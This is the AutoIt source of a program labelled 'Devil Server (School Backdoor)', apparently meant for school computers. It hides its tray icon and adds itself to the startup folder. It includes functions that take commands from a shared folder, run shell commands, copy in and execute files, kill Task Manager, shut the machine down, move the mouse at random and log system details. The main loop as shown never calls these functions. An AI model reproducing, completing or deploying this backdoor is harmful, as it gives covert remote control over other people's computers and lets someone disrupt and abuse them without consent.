#cs ----------------------------------------------------------------------------
 
 Devil Server ( School Backdoor )
 AutoIt Version: 3.3.14.2

#ce ----------------------------------------------------------------------------

#NoTrayIcon
#include <Misc.au3>
#include <WinAPIFiles.au3>
#include <FileConstants.au3>
#include <MsgBoxConstants.au3>

; The program will not start twice
_Singleton("devil_check", 0)

; Read config file
Global $Config_ClientID = IniRead("config.ini", "Config", "ClientID", "defective_client")
Global $Config_ServerPatch = IniRead("config.ini", "Config", "ServerPatch", "C:\")
Global $Config_FirstStart = IniRead("config.ini", "Config", "FirstStart", "0")

; Variables
Global $ServerData = ""

; Add backdoor to start-up
If $Config_FirstStart = "1" Then
	If Not FileExists(@StartupDir & "\devil_server.lnk") Then
		FileCreateShortcut(@ScriptFullPath, @StartupDir & "\devil_server.lnk", @ScriptDir, "", "devil_server")
	EndIf

   If FileExists(@StartupDir & "\devil_server.lnk") Then
		MsgBox($MB_OK, "DevilServer", "DevilServer added to start-up!")
	Else
		MsgBox($MB_OK, "DevilServer", "DevilServer can not add self to the start-up! Try again!")
	EndIf
EndIf

; ------------------------------------------------------------------------------

; Loop
While True
Sleep(100)

WEnd

; ------------------------------------------------------------------------------

; Get data from the shared folder
Func ReadServer()
	If FileExists($Config_ServerPatch & "\" & $Config_ClientID) Then
		Local $Data_file = FileOpen($Config_ServerPatch & "\" & $Config_ClientID,  $FO_READ)
		Global $ServerData = FileRead($Config_ServerPatch & "\" & $Config_ClientID)
		FileClose($Data_file)
		FileDelete($Config_ServerPatch & "\" & $Config_ClientID)
	EndIf
EndFunc

; Write logs to the shared folder 
Func OutputLogs()
	Local $Logs_file = FileOpen($Config_ServerPatch & "\" & $Config_ClientID & "_logs", $FO_APPEND)
	FileWriteLine($Logs_file, "Time: " & @SEC & ":" & @MIN & ":" & @HOUR & ":" & @MDAY)
	FileWriteLine($Logs_file, "Client ID: " & $Config_ClientID)
	FileWriteLine($Logs_file, "Server patch: " & $Config_ServerPatch)
	FileWriteLine($Logs_file, "First start: " & $Config_FirstStart)
	FileWriteLine($Logs_file, "Client directory: " & @ScriptFullPath)
	FileWriteLine($Logs_file, "System name: " & @ComputerName)
	If FileExists(@StartupDir & "\devil_server.lnk") Then
		FileWriteLine($Logs_file, "Added to start-up: True")
	Else
		FileWriteLine($Logs_file, "Added to start-up: False")
	EndIf
	FileClose($Logs_file)
EndFunc

; Show message
Func ShowMessageBox($Text)
	MsgBox($MB_OK, "", $Text, 10)
EndFunc

; Shutdown system
Func SystemShutdown()
	Shutdown(1)
EndFunc

; Сrazy mouse
Func CrazyMouse()
	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1)
EndFunc

; Execute to shell
Func CMDExecute($Command)
	ShellExecute($Command)
EndFunc

; Upload and run file
Func UploadAndRunFile($File_name)
	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
	FileDelete($Config_ServerPatch & "\" & $File_name)
	ShellExecute(@ScriptDir & "\" & $File_name)
EndFunc

; Block task manager
Func BlockTaskManager()
	If ProcessExists("taskmgr.exe") Then ProcessClose("taskmgr.exe")
EndFunc

; ------------------------------------------------------------------------------
























